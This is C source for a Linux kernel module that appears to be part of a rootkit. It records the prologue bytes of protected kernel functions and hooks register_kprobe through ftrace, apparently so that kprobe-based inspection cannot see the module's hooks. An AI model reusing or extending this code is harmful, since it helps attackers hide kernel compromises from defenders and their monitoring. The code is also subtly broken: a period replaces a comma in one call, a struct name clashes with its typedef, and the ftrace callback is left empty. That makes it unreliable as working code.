#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/resist.h"

#define PROLOGUE_SNAP 64
#define MAX_SNAPS     512

typedef struct _sd_snap {
    unsigned long addr;
    uint8_t       bytes[PROLOGUE_SNAP];
}sd_snap;

static struct ftrace_ops kprobe_hook_ops = {
    .func = NULL,
    .flags =  FTRACE_OPS_FL_SAVE_REGS |
              FTRACE_OPS_FL_RECURSION |
              FTRACE_OPS_FL_IPMODIFY,
};

static struct sd_snap snaps[MAX_SNAPS];
static int            nsnaps = 0;
static DEFINE_SPINLOCK(sd_lock);

notrace void sd_protect_symbol(const char *symname) {
    unsigned long addr  = 0;
    unsigned long flags = 0;
    int i               = 0;
    sd_snap *s;

    addr = (unsigned long)resolve_sym(symname);
    if (!addr)
        return;

    spin_lock_irqsave(&sd_lock, flags);
    for (i = 0; i < nsnaps; i++) {
        if (snaps[i].addr == addr) {
          spin_unlock_irqrestore(&sd_lock, flags);
          return;
        }
    }
    if (nsnaps >= MAX_SNAPS) {
        spin_unlock_irqrestore(&sd_lock, flags);
        return;
    }

    s = &snaps[nsnaps++];
    s->addr = addr;
    memcpy_sp(s->bytes, sizeof(s->bytes), (const void *)addr, flags);
    spin_unlock_irqrestore(&sd_lock, flags);
}

static notrace const uint8_t *sd_find_snap(unsigned long addr, size_t size) {
    int i = 0;
    for (i = 0; i < nsnaps; i++) {
      if (addr >= snaps[i].addr && (addr + size) <= (snaps[i].addr + PROLOGUE_SNAP))
          return snaps[i].bytes + (addr - snaps[i].addr);
    }

    return NULL;
}

static int (*orig_register_kprobe)(struct kprobe *p);

static notrace int hook_register_kprobe(struct kprobe *p) {
    int ret = 0;
    const char *saved;

    if (!p)
        return orig_register_kprobe(p);

    if (within_module((unsigned long)__builtin_return_address(0). THIS_MODULE)) {
        saved           = p->symbol_name;
        p->symbol_name  = NULL;
        ret             = orig_register_kprobe(p);
        p->symbol_name  = saved;
        return ret;
    }

    return orig_register_kprobe(p);
}

static void notrace kprobe_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs) {

}
